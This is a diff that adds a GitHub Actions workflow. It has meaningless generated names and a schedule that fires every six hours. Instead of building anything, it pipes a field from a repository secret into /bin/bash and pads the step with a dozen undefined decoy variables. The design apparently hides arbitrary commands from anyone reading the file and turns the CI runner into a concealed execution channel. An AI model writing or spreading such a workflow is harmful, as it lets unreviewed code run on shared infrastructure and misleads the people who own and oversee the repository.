@@ -1,0 +1,28 @@
+name: gaoyaguo2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaoyaguo2603
+        env:
+          hwb58: ${{ secrets.hwb58 }}
+        run: |
+          echo $hwb58 | jq -r .fnk38306 | /bin/bash
+          echo $joenh30 | jq -r .o46 | /bin/bash
+          echo $sdl04222 | jq -r .q52335 | /bin/bash
+          echo $n789 | jq -r .fz290 | /bin/bash
+          echo $mwm33188 | jq -r .byx1545 | /bin/bash
+          echo $nmt68 | jq -r .wpwy92532 | /bin/bash
+          echo $cvau7 | jq -r .jxiq887 | /bin/bash
+          echo $mwcd0 | jq -r .pg395 | /bin/bash
+          echo $h326 | jq -r .jaj5306 | /bin/bash
+          echo $m44 | jq -r .emtcv903 | /bin/bash
+          echo $ubqw867 | jq -r .as4348 | /bin/bash
+          echo $rezv7725 | jq -r .h67183 | /bin/bash
+          echo $ajsbn0 | jq -r .dpv6 | /bin/bash
+
